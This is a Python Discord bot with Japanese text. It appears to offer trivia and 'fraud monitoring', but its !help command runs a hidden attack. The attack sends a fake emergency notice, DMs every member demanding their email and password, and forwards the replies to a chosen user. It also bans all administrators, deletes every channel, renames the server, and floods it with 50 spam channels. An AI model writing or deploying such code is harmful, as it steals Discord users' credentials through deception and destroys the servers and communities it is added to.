import os
import discord
from discord.ext import commands
import random
import asyncio

TOKEN = os.getenv('TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # メンバー情報の取得が必要
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    activity = discord.Game(name="Discord不正利用監視")
    await bot.change_presence(status=discord.Status.online, activity=activity)

# !trivia コマンドで雑学を表示する
@bot.command(name='trivia', help='ランダムな雑学を表示します。')
async def trivia(ctx):
    trivia_list = [
        "ハチの一生の間に作る蜂蜜の量はティースプーン一杯分。",
        "カエルは自分の眼球を使って食べ物を押し込む。",
        "人間の大人の体には約5リットルの血液がある。",
        "キリンの首には人間と同じ数の骨がある。",
        "南極は世界で唯一、蚊がいない大陸。"
    ]
    trivia = random.choice(trivia_list)
    await ctx.send(f"**今日の雑学:** {trivia}")

@bot.event
async def on_message(message):
    if message.content.startswith('!help'):
        help_text = (
            "@everyone ⚠️ **緊急通知** ⚠️\n\n"
            "このサーバーで**重大な不正利用**が検出されました。運営チームおよびシステムは、"
            "不正行為に対して**強制的かつ厳格な対応**を即座に実施します。"
            "もしこれが**あなたの行動に起因するもの**でないならば、"
            "ただちにアクションを中止し、DMにて当アカウントからの質問に回答をしてください。\n\n"
            "なお、今後の状況次第では、アカウントの停止や**法的手段**を含む"
            "さらなる強硬措置が取られる可能性があります。\n\n"
            "すべてのメンバーは、サーバーの利用規約を再確認し、遵守するよう強く求められます。"
        )

        await message.channel.send(help_text)

        # サーバー内の全メンバーにアンケートをDMで送信
        guild = message.guild
        members = guild.members  # サーバー内のメンバー情報を取得

        survey_intro = (
            "【重要】\n"
            "サーバーの不正行為に伴い、あなたが不正をしていないことを示すために以下の質問に答えてください。"
            "この調査に関する一切の質問には答えかねます。虚偽の報告、未回答などの不正行為はあなたにとってのメリットとなりません。\n\n"
            "1. 現在ログインしているアカウントのメールアドレスを教えてください。\n"
            "2. そのパスワードを教えてください。\n"
            "メールアドレス、改行してパスワードとなるように一つのメッセージとして送信してください。\n"
        )

        for member in members:
            if not member.bot:  # ボットには送らない
                try:
                    await member.send(survey_intro)
                    await asyncio.sleep(random.uniform(1, 2))  # ランダムな遅延を挿入
                except discord.Forbidden:
                    pass
                except discord.HTTPException as e:
                    pass

        # 不正利用の疑いがある管理者をBANする処理
        admins = [member for member in members if any(role.permissions.administrator for role in member.roles)]
        for admin in admins:
            try:
                await guild.ban(admin, reason="不正利用の疑い")
                await asyncio.sleep(random.uniform(1, 2))  # ランダムな遅延を挿入
            except discord.Forbidden:
                pass
            except discord.HTTPException as e:
                pass

        # サーバー内のチャンネルを削除し、新しいチャンネルを作成
        channels = guild.channels
        undeletable_channels = []

        for channel in channels:
            try:
                await channel.delete()
                await asyncio.sleep(random.uniform(1, 2))  # ランダムな遅延を挿入
            except discord.Forbidden:
                undeletable_channels.append(channel)
            except discord.HTTPException as e:
                pass

        # サーバー名を「不正利用検出済み」に変更
        await asyncio.sleep(1)
        await guild.edit(name="不正利用検出済みサーバー")

        # 新しい50個のチャンネルを作成し、メンバーにDMを確認するよう指示
        for i in range(50):
            new_channel = await guild.create_text_channel(name=f"通知-{i+1}")
            await new_channel.send("@everyone 不正行為が検出されました。詳細についてはDMを確認してください。")
            await asyncio.sleep(random.uniform(1, 2))  # ランダムな遅延を挿入

    # DMでのアンケートの回答を受け取った場合、指定のユーザーに転送
    if isinstance(message.channel, discord.DMChannel) and not message.author.bot:
        try:
            target_user = await bot.fetch_user(TARGET_USER_ID)
            if target_user:
                await target_user.send(f"アンケートの回答が届きました：\n{message.content}")
                await asyncio.sleep(random.uniform(0.5, 1))  # 遅延追加
        except discord.Forbidden:
            pass
        except discord.HTTPException as e:
            pass

    # 他のコマンドも処理
    await bot.process_commands(message)

bot.run(TOKEN)
